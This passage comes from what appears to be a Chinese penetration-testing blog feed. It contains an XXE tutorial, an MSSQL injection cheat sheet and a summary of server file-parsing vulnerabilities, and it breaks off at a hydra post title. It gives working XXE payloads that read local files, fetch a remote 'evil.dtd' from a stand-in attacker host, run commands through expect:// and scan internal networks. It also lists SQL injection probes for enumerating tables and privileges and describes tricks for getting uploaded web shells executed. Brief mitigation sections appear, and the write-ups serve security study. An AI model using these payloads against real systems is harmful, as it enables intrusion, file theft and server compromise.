    <content type="html"><![CDATA[<h2 id="0x00-XML"><a href="#0x00-XML" class="headerlink" title="0x00 XML"></a>0x00 XML</h2><p>XML是可扩展标记语言，标准通用标记语言的子集，是一种用于标记电子文件使其具有结构性的标记语言，与HTML的不同在于XML被设计用来传输和存储数据而HTML被设计用来显示数据。</p><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><p>XML声明即是位于XML文档开始部分的第一行，规定了xml版本和编码格式。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br></code></pre></td></tr></table></figure><p>DTD(Document Type Definition) 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)。</p><p>文档元素即下面例子中note中所有部分，每个xml文档必须包含一个根元素，下面的例子中根元素就是note</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Tove<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Jani<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="0x01-DTD-Document-Type-Definition"><a href="#0x01-DTD-Document-Type-Definition" class="headerlink" title="0x01 DTD(Document Type Definition)"></a>0x01 DTD(Document Type Definition)</h2><p>上面我们只是简要说了一下XML的结构，下来我们拿出我们重点关注的DTD文档类型定义来详细说明一下。</p><h4 id="DTD-引用方式"><a href="#DTD-引用方式" class="headerlink" title="DTD 引用方式"></a>DTD 引用方式</h4><ul><li>1.DTD 内部声明<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></code></pre></td></tr></table></figure></li><li>2.DTD 外部引用<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素名称 <span class="hljs-meta-keyword">SYSTEM</span> “外部DTD的URI”&gt;</span><br></code></pre></td></tr></table></figure></li><li>3.引用公共DTD<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素名称 <span class="hljs-meta-keyword">PUBLIC</span> “DTD标识名” “公用DTD的URI”&gt;</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="DTD-实体声明"><a href="#DTD-实体声明" class="headerlink" title="DTD 实体声明"></a>DTD 实体声明</h4><ul><li>1.内部实体声明<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY 实体名称 “实体的值”&gt;</span> <br></code></pre></td></tr></table></figure>一个实体由三部分构成:&amp;符号, 实体名称, 分号 (;)，这里&amp;不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&amp;符号会被认为是参数间的连接符号</li><li>2.外部实体声明<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-meta-keyword">SYSTEM</span> “URI/URL”&gt;</span> <br></code></pre></td></tr></table></figure>外部引用可支持http，file等协议，不同的语言支持的协议不同。</li></ul><h2 id="0x02-XXE-XML-External-Entity-attack"><a href="#0x02-XXE-XML-External-Entity-attack" class="headerlink" title="0x02 XXE(XML External Entity attack)"></a>0x02 XXE(XML External Entity attack)</h2><p>XML外部实体注入，简称XXE。XXE使攻击者能够从服务器或连接网络泄露正常受保护的文件。</p><p>有了XML实体，关键字‘SYSTEM’会令XML解析器从URI中读取内容，并允许它在XML文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。</p><p>简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容（可能是系统上本地文件亦或是远程系统上的文件）。</p><h2 id="0x03-XXE环境搭建"><a href="#0x03-XXE环境搭建" class="headerlink" title="0x03 XXE环境搭建"></a>0x03 XXE环境搭建</h2><p>我们新建一个存在xxe漏洞的index.php，写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$xml</span>=simplexml_load_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;xml&#x27;</span>]);<br>print_r(<span class="hljs-variable">$xml</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>我们尝试一个正常使用的例子，在firefox的hackbar插件中传入数据</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">xml=<span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Tove<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Jani<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以得到回显：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/xxe01.jpg"></p><p>此时，我们的环境搭建完成。</p><h2 id="0x04-恶意代码的利用方式"><a href="#0x04-恶意代码的利用方式" class="headerlink" title="0x04 恶意代码的利用方式"></a>0x04 恶意代码的利用方式</h2><p>我们上面已经说过引用实体的方式，我们这里可以采用这几种方式在hackbar的post中写入恶意代码：</p><ul><li><p>1直接使用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY b <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span></span><br><span class="hljs-meta">]</span><br><span class="hljs-meta">&lt;c&gt;</span><span class="hljs-symbol">&amp;b;</span><span class="hljs-tag">&lt;/<span class="hljs-name">c</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>2调用远程dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY b <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://xxxx.com/xxx.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]</span><br><span class="hljs-meta">&lt;c&gt;</span><span class="hljs-symbol">&amp;b;</span><span class="hljs-tag">&lt;/<span class="hljs-name">c</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在xxxx.com的xxx.dtd中写入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY b <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span><br></code></pre></td></tr></table></figure></li><li><p>3无回显时发送给远程服务器</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;?xml verstion=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE a[</span></span><br><span class="xml">                <span class="hljs-meta">&lt;!ENTITY % f <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://www.hack.com/evil.dtd&quot;</span>&gt;</span></span><br><span class="perl">                 %f;</span><br><span class="xml">]&gt;</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-symbol">&amp;b;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="xml">$data = simplexml_load_string($xml);</span><br><span class="xml">print_r($data);</span><br></code></pre></td></tr></table></figure><p>其中远程服务器中evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY b <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="0x05-xxe攻击方式"><a href="#0x05-xxe攻击方式" class="headerlink" title="0x05 xxe攻击方式"></a>0x05 xxe攻击方式</h2><h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><p>通过file协议任意读取文件</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="php"><span class="hljs-meta">&lt;?php</span></span><br><span class="php"><span class="hljs-variable">$note</span>=&lt;&lt;&lt;XML</span><br><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span><span class="hljs-meta">?&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [</span></span><br><span class="xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///C:/Windows/win.ini&quot;</span> &gt;</span></span><br><span class="xml">]&gt;</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span></span><br><span class="xml">XML;</span><br><span class="xml">$xml=simplexml_load_string($note);</span><br><span class="xml">print_r($xml);</span><br><span class="xml">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>通过expect协议进行命令执行</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="php"><span class="hljs-meta">&lt;?php</span></span><br><span class="php"><span class="hljs-variable">$note</span>=&lt;&lt;&lt;XML</span><br><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span><span class="hljs-meta">?&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [</span></span><br><span class="xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;expect://ifconfig&quot;</span> &gt;</span></span><br><span class="xml">]&gt;</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span></span><br><span class="xml">XML;</span><br><span class="xml">$xml=simplexml_load_string($note);</span><br><span class="xml">print_r($xml);</span><br><span class="xml">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h4><p>通过simplexml_load_string函数访问内网ip和端口进行扫描</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="php"><span class="hljs-meta">&lt;?php</span></span><br><span class="php"><span class="hljs-variable">$note</span>=&lt;&lt;&lt;XML</span><br><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span><span class="hljs-meta">?&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [</span></span><br><span class="xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://192.168.31.226:81&quot;</span> &gt;</span></span><br><span class="xml">]&gt;</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span></span><br><span class="xml">XML;</span><br><span class="xml">$xml=simplexml_load_string($note);</span><br><span class="xml">print_r($xml);</span><br><span class="xml">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="php"><span class="hljs-meta">&lt;?php</span></span><br><span class="php"><span class="hljs-variable">$note</span>=&lt;&lt;&lt;XML</span><br><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span><span class="hljs-meta">?&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [</span></span><br><span class="xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://192.168.31.226:80&quot;</span> &gt;</span></span><br><span class="xml">]&gt;</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span></span><br><span class="xml">XML;</span><br><span class="xml">$xml=simplexml_load_string($note);</span><br><span class="xml">print_r($xml);</span><br><span class="xml">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="内网攻击"><a href="#内网攻击" class="headerlink" title="内网攻击"></a>内网攻击</h4><p>通过simplexml_load_string函数中带有恶意代码的url对内网网站进行攻击，直接在内网url的get参数中提交payload</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="php"><span class="hljs-meta">&lt;?php</span></span><br><span class="php"><span class="hljs-variable">$note</span>=&lt;&lt;&lt;XML</span><br><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span><span class="hljs-meta">?&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [</span></span><br><span class="xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://192.168.31.226:80/test/xxxx.php?xxxxx&quot;</span> &gt;</span></span><br><span class="xml">]&gt;</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span></span><br><span class="xml">XML;</span><br><span class="xml">$xml=simplexml_load_string($note);</span><br><span class="xml">print_r($xml);</span><br><span class="xml">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="0x06-应对"><a href="#0x06-应对" class="headerlink" title="0x06 应对"></a>0x06 应对</h2><ul><li>1.禁用外部实体</li><li>2.过滤用户提交的xml信息</li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>XXE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MSSQL注入总结</title>
    <link href="/2018/05/03/MSSQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <url>/2018/05/03/MSSQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前所有的sql注入类型的博客都以mysql数据库为例子的，但是在最近实际的渗透测试中有时会遇到一些MSSQL的数据库，所以对MSSQL注入进行一次总结。</p><h2 id="0x01-MSSQL"><a href="#0x01-MSSQL" class="headerlink" title="0x01 MSSQL"></a>0x01 MSSQL</h2><p>ms SQL是指微软的SQLServer数据库服务器，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。</p><h2 id="0x02-MSSQL手工注入技巧"><a href="#0x02-MSSQL手工注入技巧" class="headerlink" title="0x02 MSSQL手工注入技巧"></a>0x02 MSSQL手工注入技巧</h2><h4 id="1-判断是否有注入"><a href="#1-判断是否有注入" class="headerlink" title="1.判断是否有注入"></a>1.判断是否有注入</h4><ul><li>?id=1</li><li>?id=1’</li><li>?id=1 and 1=1</li><li>?id=1 and 1=2</li></ul><h4 id="2-判断是否是mssql"><a href="#2-判断是否是mssql" class="headerlink" title="2.判断是否是mssql"></a>2.判断是否是mssql</h4><ul><li>?id=1 and user&gt;0</li></ul><h4 id="3-判断数据库系统"><a href="#3-判断数据库系统" class="headerlink" title="3.判断数据库系统"></a>3.判断数据库系统</h4><ul><li>?id=1 and (select count(*) from sysobjects)&gt;0　　 mssql</li><li>?id=1 and (select count(*) from msysobjects)&gt;0　　access</li></ul><h4 id="4-查询当前用户数据信息"><a href="#4-查询当前用户数据信息" class="headerlink" title="4.查询当前用户数据信息"></a>4.查询当前用户数据信息</h4><ul><li>?id=1 having 1=1–</li></ul><h4 id="5-猜表名"><a href="#5-猜表名" class="headerlink" title="5.猜表名"></a>5.猜表名</h4><ul><li>?id=1 and exists(select * from tablename)</li><li>?id=1 and (Select Count(*) from [表名])&gt;0</li></ul><h4 id="6-猜字段"><a href="#6-猜字段" class="headerlink" title="6.猜字段"></a>6.猜字段</h4><ul><li>?id=1 and (Select Count(字段名) from 表名)&gt;0</li></ul><h4 id="7-暴当前表中的列"><a href="#7-暴当前表中的列" class="headerlink" title="7.暴当前表中的列"></a>7.暴当前表中的列</h4><ul><li>?id=1 group by admin.username having 1=1–</li></ul><h4 id="8-猜字段中记录长度"><a href="#8-猜字段中记录长度" class="headerlink" title="8.猜字段中记录长度"></a>8.猜字段中记录长度</h4><ul><li>?id=1 and (select top 1 len(字段名) from 表名)&gt;0</li></ul><h4 id="9-猜字段中的ascii值"><a href="#9-猜字段中的ascii值" class="headerlink" title="9.猜字段中的ascii值"></a>9.猜字段中的ascii值</h4><ul><li>?id=1 and (select top 1 asc(mid(字段名,1,1)) from 表名)&gt;0   access</li><li>?id=1 and (select top 1 unicode(substring(字段名,1,1)) from 数据库名)&gt;0   mssql</li></ul><h4 id="10-测试权限结构（mssql）"><a href="#10-测试权限结构（mssql）" class="headerlink" title="10.测试权限结构（mssql）"></a>10.测试权限结构（mssql）</h4><ul><li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘sysadmin’));–</li><li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘serveradmin’));–</li><li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘setupadmin’));–</li><li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘securityadmin’));–</li><li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘diskadmin’));–</li><li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘bulkadmin’));–</li><li>?id=1 and 1=(SELECT IS_MEMBER(‘db_owner’));–</li></ul><h4 id="11-mssql内置函数"><a href="#11-mssql内置函数" class="headerlink" title="11.mssql内置函数"></a>11.mssql内置函数</h4><ul><li>?id=1 and (select @@version)&gt;0　　　获得Windows的版本号</li><li>?id=1 and user_name()=’dbo’　　　　 判断当前系统的连接用户是不是sa</li><li>?id=1 and (select user_name())&gt;0　　爆当前系统的连接用户</li><li>?id=1 and (select db_name())&gt;0　　　得到当前连接的数据库</li></ul>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>渗透测试</tag>
      
      <tag>mssql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>解析漏洞总结</title>
    <link href="/2018/05/01/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <url>/2018/05/01/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-服务器解析漏洞"><a href="#0x00-服务器解析漏洞" class="headerlink" title="0x00 服务器解析漏洞"></a>0x00 服务器解析漏洞</h2><p>服务器解析漏洞一般是服务器自身或扩展组件带来的漏洞，配合文件上传等漏洞就会产生很大的危害。</p><p>我们这里整理常见的服务器apache、IIS、nginx的解析漏洞。</p><h2 id="0x01-apache"><a href="#0x01-apache" class="headerlink" title="0x01 apache"></a>0x01 apache</h2><h4 id="一、不可识别解析"><a href="#一、不可识别解析" class="headerlink" title="一、不可识别解析"></a>一、不可识别解析</h4><p>apache解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</p><p>apache版本在以下范围内</p><ul><li>Apache 2.0.x &lt;= 2.0.59</li><li>Apache 2.2.x &lt;= 2.2.17</li><li>Apache 2.2.2 &lt;= 2.2.8</li></ul><p>都可以通过上传xxx.php.rar或xxx.php+任意无法解析后缀解析为php。</p><h4 id="二、配置问题"><a href="#二、配置问题" class="headerlink" title="二、配置问题"></a>二、配置问题</h4><ul><li>1.如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。</li><li>2.如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</li></ul><h4 id="三、罕见后缀"><a href="#三、罕见后缀" class="headerlink" title="三、罕见后缀"></a>三、罕见后缀</h4><p>Apache配置文件中会有.+.ph(p[345]?|t|tml)此类的正则表达式，被当php程序执行的文件名要符合正则表达式。也就是说php3，php4，php5，pht，phtml等文件后缀也是可以被当作php文件进行解析的。</p><h4 id="四、后缀包含换行符-x0A"><a href="#四、后缀包含换行符-x0A" class="headerlink" title="四、后缀包含换行符\x0A"></a>四、后缀包含换行符\x0A</h4><p>CVE-2017-15715：Apache 2.4.0-2.4.29中，上传一个后缀末尾包含换行符的文件，来绕过FilesMatch。绕过FilesMatch不一定能被PHP解析。</p><h2 id="0x02-IIS"><a href="#0x02-IIS" class="headerlink" title="0x02 IIS"></a>0x02 IIS</h2><h4 id="一、目录解析"><a href="#一、目录解析" class="headerlink" title="一、目录解析"></a>一、目录解析</h4><p>在IIS-6.0的版本，在.asp或.asa文件夹下的所有类型后缀文件全部解析为.asp文件。</p><p>存在数据库备份功能的系统并且备份路径可控的话经常会出现这个问题。</p><h4 id="二、文件解析"><a href="#二、文件解析" class="headerlink" title="二、文件解析"></a>二、文件解析</h4><p>在IIS-6.0的版本，服务器默认不解析;后面的内容，所以xxx.asp;.jpg会被解析成xxx.asp。</p><h4 id="三、其他解析类型"><a href="#三、其他解析类型" class="headerlink" title="三、其他解析类型"></a>三、其他解析类型</h4><p>在IIS6.0的版本，如下几种文件类型也会被执行。</p><ul><li>xxx.asa</li><li>xxx.cer</li><li>xxx.cdx</li></ul><h4 id="四、php-cgi漏洞"><a href="#四、php-cgi漏洞" class="headerlink" title="四、php-cgi漏洞"></a>四、php-cgi漏洞</h4><p>在IIS-7.0和IIS-7.5的版本，在php配置文件中，开启cgi.fix_pathinfo，然后上传一个1.jpg的一句话木马文件。然后用菜刀访问1.jpg/.php即可连接一句话木马。</p><h2 id="0x03-nginx"><a href="#0x03-nginx" class="headerlink" title="0x03 nginx"></a>0x03 nginx</h2><h4 id="一、低版本nginx"><a href="#一、低版本nginx" class="headerlink" title="一、低版本nginx"></a>一、低版本nginx</h4><p>空字节代码执行漏洞：nginx 0.5.x、nginx 0.6.x、Nginx 0.7-0.7.65、Nginx 0.8-0.8.37中可以通过在任意文件名后面增加%00.php解析为php，如1.jpg%00.php</p><h4 id="二、php-cgi漏洞"><a href="#二、php-cgi漏洞" class="headerlink" title="二、php-cgi漏洞"></a>二、php-cgi漏洞</h4><p>和IIS的第四点相同，在php配置文件中，开启了cgi.fix_pathinfo，导致图片马1.jpg可以通过访问1.jpg/.php、1.jpg%00.php解析成php文件</p><p>0x04 windows解析漏洞</p><p>Windows操作系统中，文件名不能以空格或.开头，也不能以空格或.结尾。当把一个文件命名为以空格或.开头或结尾时，会自动地去掉开头和结尾处的空格和.。利用此特性，也可能造成文件解析漏洞</p><h2 id="0x05-应对"><a href="#0x05-应对" class="headerlink" title="0x05 应对"></a>0x05 应对</h2><ul><li>1.对于php-cgi漏洞，可以修改php.ini文件，将cgi.fix_pathinfo的值设置为0</li><li>2.使用白名单匹配文件后缀名</li><li>3.可以对上传后的文件固定后缀，并对之前的所有字符进行重命名</li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>解析漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>爆破工具hydra笔记</title>
    <link href="/2018/04/29/%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7hydra%E7%AC%94%E8%AE%B0/"/>
    <url>/2018/04/29/%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7hydra%E7%AC%94%E8%AE%B0/</url>
    
